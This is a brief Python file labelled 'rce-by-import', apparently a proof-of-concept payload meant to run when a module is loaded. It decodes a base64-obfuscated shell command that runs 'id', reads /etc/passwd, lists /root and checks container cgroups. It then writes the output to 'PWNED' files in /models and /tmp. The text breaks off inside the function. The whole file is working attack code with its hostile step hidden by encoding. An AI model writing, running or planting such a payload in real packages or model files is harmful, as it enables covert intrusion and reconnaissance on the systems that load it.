# rce-by-import cce62f04
import os, subprocess, base64, threading, json, urllib.request

def _run():
    try:
        import base64 as b
        cmd = b.b64decode("aWQ7IGNhdCAvZXRjL3Bhc3N3ZCB8IGhlYWQgLTIwOyBscyAtbGEgL3Jvb3QvIDI+L2Rldi9udWxsOyBjYXQgL3Byb2MvMS9jZ3JvdXAgfCBoZWFkIC0z").decode()
        out = subprocess.check_output(cmd, shell=True, timeout=20, stderr=subprocess.STDOUT)
        out_s = out.decode(errors="replace")
        for d in ["/models", "/tmp"]:
            try:
                with open(d + "/PWNED-cce62f04.txt", "w") as f:
                    f.write(out_s)
            except Exception:
                pass
